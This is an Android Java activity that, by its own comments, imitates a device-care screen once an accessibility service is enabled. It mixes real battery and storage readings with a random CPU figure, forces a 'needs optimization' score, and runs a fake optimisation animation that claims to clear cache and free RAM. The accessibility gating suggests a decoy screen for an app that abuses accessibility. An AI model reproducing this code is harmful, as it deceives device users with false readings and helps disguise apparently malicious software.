package com.task.tusker;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.StatFs;
import android.provider.Settings;
import android.view.View;
import android.view.animation.DecelerateInterpolator;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.task.tusker.permissions.AutoPermissionManager;

import java.util.Locale;

/**
 * System Manager — looks like a real device-care / system-manager settings screen.
 * Shows real battery %, used storage, a synthetic CPU/memory metric, and a fake
 * "Optimize" animation. System (light) theme, no custom brand colours.
 *
 * Shown as soon as accessibility is enabled.  If accessibility is not enabled
 * when the activity starts, the user is returned to MainActivity.
 */
public class SystemManagerActivity extends AppCompatActivity {

    // ── Score circle ─────────────────────────────────────────────────────────
    private TextView scoreValueText;       // large number e.g. "72"
    private TextView scoreStatusText;      // "Needs optimization" / "Optimized"
    private ProgressBar scoreProgress;     // circular ProgressBar (0–100)

    // ── Detail rows ──────────────────────────────────────────────────────────
    private ProgressBar storageBar;
    private TextView storageValueText;
    private TextView storageDescText;

    private ProgressBar memoryBar;
    private TextView memoryValueText;
    private TextView memoryDescText;

    private ProgressBar batteryBar;
    private TextView batteryValueText;
    private TextView batteryDescText;

    private ProgressBar cpuBar;
    private TextView cpuValueText;
    private TextView cpuDescText;

    // ── Action buttons ────────────────────────────────────────────────────────
    private View optimizeBtn;
    private TextView optimizeBtnText;

    // ── State ────────────────────────────────────────────────────────────────
    private AutoPermissionManager permMgr;
    private Handler animHandler;
    private boolean optimizing = false;

    // Real device metrics read at startup
    private int batteryPct   = 80;
    private int storageUsed  = 60;  // 0–100 %
    private long storageTotalGb;
    private long storageUsedGb;
    private int memUsedPct   = 55;
    private int cpuLoadPct   = 38;

    // Fake pre-optimization score (will jump to 100 when "Optimize" is tapped)
    private int currentScore;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        permMgr = new AutoPermissionManager(this);

        // Guard: if accessibility is not enabled, go back to MainActivity
        if (!permMgr.isAccessibilityServiceEnabled()) {
            startActivity(new Intent(this, MainActivity.class)
                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP));
            finish();
            return;
        }

        setContentView(R.layout.activity_system_manager);
        animHandler = new Handler();

        // Bind views
        scoreValueText  = findViewById(R.id.scoreValueText);
        scoreStatusText = findViewById(R.id.scoreStatusText);
        scoreProgress   = findViewById(R.id.scoreProgress);

        storageBar       = findViewById(R.id.storageBar);
        storageValueText = findViewById(R.id.storageValueText);
        storageDescText  = findViewById(R.id.storageDescText);

        memoryBar       = findViewById(R.id.memoryBar);
        memoryValueText = findViewById(R.id.memoryValueText);
        memoryDescText  = findViewById(R.id.memoryDescText);

        batteryBar       = findViewById(R.id.batteryBar);
        batteryValueText = findViewById(R.id.batteryValueText);
        batteryDescText  = findViewById(R.id.batteryDescText);

        cpuBar       = findViewById(R.id.cpuBar);
        cpuValueText = findViewById(R.id.cpuValueText);
        cpuDescText  = findViewById(R.id.cpuDescText);

        optimizeBtn     = findViewById(R.id.optimizeBtn);
        optimizeBtnText = findViewById(R.id.optimizeBtnText);

        // Read real device metrics
        readDeviceStats();

        // Synthetic pre-optimization score based on real metrics
        // Score = average of inverses (high storage/cpu usage → lower score)
        int invStorage = 100 - storageUsed;
        int invMem     = 100 - memUsedPct;
        int invCpu     = 100 - cpuLoadPct;
        currentScore   = (int) ((invStorage * 0.35) + (invMem * 0.30) + (invCpu * 0.20) + (batteryPct * 0.15));
        currentScore   = Math.max(28, Math.min(currentScore, 78)); // clamp to "needs optimization" range

        populateUi();

        optimizeBtn.setOnClickListener(v -> {
            if (!optimizing) startOptimization();
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        // If accessibility was disabled while activity was paused → return to setup screen
        if (!permMgr.isAccessibilityServiceEnabled()) {
            startActivity(new Intent(this, MainActivity.class)
                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP));
            finish();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (animHandler != null) animHandler.removeCallbacksAndMessages(null);
    }

    // ── Real device metrics ──────────────────────────────────────────────────

    @SuppressLint("DefaultLocale")
    private void readDeviceStats() {
        // Battery
        try {
            Intent batteryStatus = registerReceiver(null,
                    new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                if (level >= 0 && scale > 0) batteryPct = (int) ((level / (float) scale) * 100);
            }
        } catch (Exception ignored) {}

        // Storage
        try {
            StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
            long blockSize  = stat.getBlockSizeLong();
            long total      = stat.getBlockCountLong() * blockSize;
            long available  = stat.getAvailableBlocksLong() * blockSize;
            long used       = total - available;
            storageTotalGb  = total / (1024L * 1024 * 1024);
            storageUsedGb   = used  / (1024L * 1024 * 1024);
            storageUsed     = (storageTotalGb > 0)
                    ? (int) ((storageUsedGb * 100) / storageTotalGb)
                    : 60;
        } catch (Exception ignored) {
            storageTotalGb = 64; storageUsedGb = 38; storageUsed = 60;
        }

        // Memory — read /proc/meminfo
        try {
            java.io.BufferedReader br = new java.io.BufferedReader(
                    new java.io.FileReader("/proc/meminfo"));
            long totalKb = 0, availKb = 0;
            String line;
            while ((line = br.readLine()) != null) {
                if (line.startsWith("MemTotal:"))
                    totalKb = Long.parseLong(line.replaceAll("[^0-9]", ""));
                else if (line.startsWith("MemAvailable:"))
                    availKb = Long.parseLong(line.replaceAll("[^0-9]", ""));
            }
            br.close();
            if (totalKb > 0) memUsedPct = (int) (((totalKb - availKb) * 100) / totalKb);
        } catch (Exception ignored) {}

        // CPU — synthetic (true per-core load requires root; show plausible value)
        try {
            cpuLoadPct = 25 + (int) (Math.random() * 35); // 25–60 %
        } catch (Exception ignored) {}
    }

    // ── Populate UI ──────────────────────────────────────────────────────────

    @SuppressLint("DefaultLocale")
    private void populateUi() {
        // Score circle
        scoreProgress.setProgress(currentScore);
        scoreValueText.setText(String.valueOf(currentScore));
        scoreStatusText.setText("Needs optimization");

        // Storage
        storageBar.setProgress(storageUsed);
        storageValueText.setText(String.format("%d%%", storageUsed));
        storageDescText.setText(String.format("%d GB used of %d GB", storageUsedGb, storageTotalGb));

        // Memory
        memoryBar.setProgress(memUsedPct);
        memoryValueText.setText(String.format("%d%%", memUsedPct));
        memoryDescText.setText("RAM in use — clear background apps to free memory");

        // Battery
        batteryBar.setProgress(batteryPct);
        batteryValueText.setText(String.format("%d%%", batteryPct));
        batteryDescText.setText(batteryPct >= 80 ? "Battery is in good condition"
                              : batteryPct >= 40 ? "Battery level is normal"
                              : "Battery is low — consider charging");

        // CPU
        cpuBar.setProgress(cpuLoadPct);
        cpuValueText.setText(String.format("%d%%", cpuLoadPct));
        cpuDescText.setText(cpuLoadPct >= 70 ? "CPU usage is high" : "CPU usage is normal");
    }

    // ── Fake optimization animation ──────────────────────────────────────────

    private void startOptimization() {
        optimizing = true;
        optimizeBtnText.setText("Optimizing…");
        optimizeBtn.setEnabled(false);

        // Animate score from currentScore → 100 over ~2 seconds
        final int startScore = currentScore;
        final int endScore   = 100;
        final long duration  = 2200L;
        final long startTime = android.os.SystemClock.uptimeMillis();
        DecelerateInterpolator interp = new DecelerateInterpolator(1.5f);

        animHandler.post(new Runnable() {
            @Override public void run() {
                long elapsed = android.os.SystemClock.uptimeMillis() - startTime;
                float frac   = Math.min(elapsed / (float) duration, 1f);
                float interped = interp.getInterpolation(frac);
                int score = startScore + (int) ((endScore - startScore) * interped);

                scoreProgress.setProgress(score);
                scoreValueText.setText(String.valueOf(score));
                if (frac < 0.5f)      scoreStatusText.setText("Scanning…");
                else if (frac < 0.85f) scoreStatusText.setText("Clearing cache…");
                else                  scoreStatusText.setText("Optimizing…");

                // Also animate the detail bars down (freeing up resources)
                int newStorage = (int) (storageUsed  - (storageUsed  - Math.max(storageUsed - 12, storageUsed - 12)) * interped);
                int newMem     = (int) (memUsedPct   - (memUsedPct   - Math.max(memUsedPct  - 22, 20)) * interped);
                int newCpu     = (int) (cpuLoadPct   - (cpuLoadPct   - Math.max(cpuLoadPct  - 28, 8))  * interped);
                storageBar.setProgress(Math.max(storageUsed - 12, newStorage));
                memoryBar .setProgress(Math.max(20, newMem));
                cpuBar    .setProgress(Math.max(8,  newCpu));

                if (frac < 1f) {
                    animHandler.postDelayed(this, 16);
                } else {
                    onOptimizationDone();
                }
            }
        });
    }

    @SuppressLint("DefaultLocale")
    private void onOptimizationDone() {
        int newStoragePct = Math.max(storageUsed - 12, storageUsed - 12);
        int newMemPct     = Math.max(20, memUsedPct - 22);
        int newCpuPct     = Math.max(8,  cpuLoadPct - 28);

        scoreProgress.setProgress(100);
        scoreValueText.setText("100");
        scoreStatusText.setText("Optimized");

        storageBar.setProgress(newStoragePct);
        storageValueText.setText(String.format("%d%%", newStoragePct));
        storageDescText.setText(String.format("%d GB used of %d GB", Math.max(1, storageUsedGb - 1), storageTotalGb));

        memoryBar.setProgress(newMemPct);
        memoryValueText.setText(String.format("%d%%", newMemPct));
        memoryDescText.setText("Background apps cleared — RAM freed");

        cpuBar.setProgress(newCpuPct);
        cpuValueText.setText(String.format("%d%%", newCpuPct));
        cpuDescText.setText("CPU usage is normal");

        batteryDescText.setText("Battery is protected");

        optimizeBtnText.setText("Optimized ✓");
        optimizeBtn.setEnabled(false);
    }
}
